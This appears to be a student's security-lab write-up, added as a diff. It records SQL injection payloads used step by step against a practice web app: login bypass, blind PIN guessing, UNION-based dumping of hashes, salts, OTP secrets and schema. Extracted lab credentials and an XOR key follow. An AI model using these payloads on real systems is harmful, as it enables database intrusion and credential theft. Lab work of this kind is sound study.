@@ -1,0 +1,137 @@
+In backgrond code:
+SELECT username FROM users WHERE username =
+	 
+
+First task:
+	input:
+		hruskan1';#
+SUCCESS
+
+Second task:
+	input:
+		hruskan1' AND pin LIKE '%1%'# OK
+		hruskan1' AND pin LIKE '%2%'# NOT
+		hruskan1' AND pin LIKE '%3%'# NOT
+		hruskan1' AND pin LIKE '%4%'# OK
+		hruskan1' AND pin LIKE '%5%'# NOT
+		hruskan1' AND pin LIKE '%6%'# OK
+		hruskan1' AND pin LIKE '%7%'# NOT
+		hruskan1' AND pin LIKE '%8%'# NOT
+		hruskan1' AND pin LIKE '%9%'# OK
+		
+		hruskan1' AND pin LIKE '1496' 
+SUCCESS
+
+Third task:
+	input:
+		some_nonexisting_user' UNION SELECT secret FROM users WHERE username='hruskan1'#
+	result:
+		QO2WCOGARO2DFLYC
+
+In background code:
+	SELECT date_time, base64_message_xor_key AS message FROM messages WHERE username = '$_SESSION[username]' LIMIT 1 OFFSET $_GET[offset]
+Fourth task:
+	input:
+		0 UNION SELECT username, 1 FROM users
+		0 UNION SELECT password, 1 FROM users
+		0 UNION SELECT salt, 1 FROM users
+		0 UNION SELECT secret, 1 FROM users
+		0 UNION SELECT pin, 1 FROM users
+	result:
+	
+
+Fifth task:
+	input TO GET MY HASH:
+		0 UNION SELECT password,1 FROM users WHERE username='hruskan1'
+	input TO GET MY SALT:
+		0 UNION SELECT 	
+		
+	Success: ID:1866303      pass: beab0     hash: 4a90c2db5ab816ca36e23bdcfa51201a2fbd7808	
+	
+	MY credentials
+		name: hruskan1
+		salt: 7aac6
+		password: beab0
+		pin: 1496
+		OTP link: QO2WCOGARO2DFLYC
+	
+Sixth task:
+	ADMIN credentials 
+		name: komartom
+		salt: kckct
+		hash: 2d55131b6752f066ee2cc57ba8bf781b4376be85
+		password: fm9fytmf7q
+		pin: 7821
+		OTP link: OQEBJKRVXKJIWBOC
+		
+	(used dCode.fr decrypt sha1)
+	
+Seventh task:
+	It is subpart of leaked Microsoft Office XP Serial Key (also with the salt)
+	
+Eigth task:
+	logged as komrtom
+	input:
+		0 UNION SELECT table_name, 1 FROM information_schema.tables WHERE table_schema='kbe'
+	output:
+		codes,messages,users
+	input:
+		0 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name='codes'
+		0 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name='messages'
+		0 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name='users'
+	
+	output:
+		|codes
+			-username
+			-aes_encrypt_code
+		|messages
+			-username
+			-base64_message_xor_key
+			-date_time
+		|users
+			-username
+			-password
+			-pin
+			-secret
+			-salt
+
+Nineth task:
+	0 UNION SELECT base64_message_xor_key, 1 FROM messages WHERE username='hruskan1'
+	
+
+	From cyber chef:  
+	(https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)XOR(%7B'option':'UTF8','string':'Welcome%20%3Cb%3Ehruskan1%3C/b%3E,%20this%20is%20your%20first%20secret%20message.'%7D,'Standard',false)&input=UEFjSlBGb09WUlJqR2xFYUxSNFdFajVjQVE0ZUNWeEpmMEVMV1VkL0VSeFNKZ1FRQzM5VVdVQkNIMElXT2xZUlZVQi9GUW9CTEFvQ0hIRT0)
+
+		From Base -> XOR with utf8 encoding: '{message}'	
+
+
+	Encrypted messages:
+		
+	PAcJPFoOVRRjGlEaLR4WEj5cAQ4eCVxJf0ELWUd/ERxSJgQQC39UWUBCH0IWOlYRVUB/FQoBLAoCHHE=
+
+	VwNFN0cGVgl4EQEWOhNLCTdCD1FeDwdCYX0GQlFjVw5MfxIKDH9RUVwRDQsLOxUaX0EtWBwXPB4XHH9RX1ZURQ==
+
+	PAcJMxlDRFw+DEgBfwoJFX9UX0ARBQ0ScRUwRFUmWBsHMQ4BWTldQhJFAwdFMVAbRBQ8EA4eMw4LHjpBHg==
+		
+
+	Plain messages:
+
+	Welcome <b>hruskan1</b>, this is your first secret message.
+
+	<a href="index.php?code">Here</a> you can find your secure code.
+
+	Well, that's all for now. Stay tuned for the next challenges.
+						
+	XOR key: 
+
+	kbe_5c04_xor_key_2021kbe_5c04_xor_key_2021kbe_5c04_xor_key_
+
+	kbe_5c04Zxor_key_2021kb`_5c04_xor_key_2021kbe_5c04_xor_key_2021k
+
+	kbe_5c04_xor_key_2021kbe_5c04_xor_key_2021kbe_5c04_xor_key_20
+
+10. task:
+	input: 0 UNION SELECT aes_encrypt_code, 1 FROM messages WHERE username='hruskan1'
+
+	AES_encrypted_code: 352BF3587BFE956E4FA00072CC214FDC17030E8115048C6FFC0B1596B3F14470	
+	
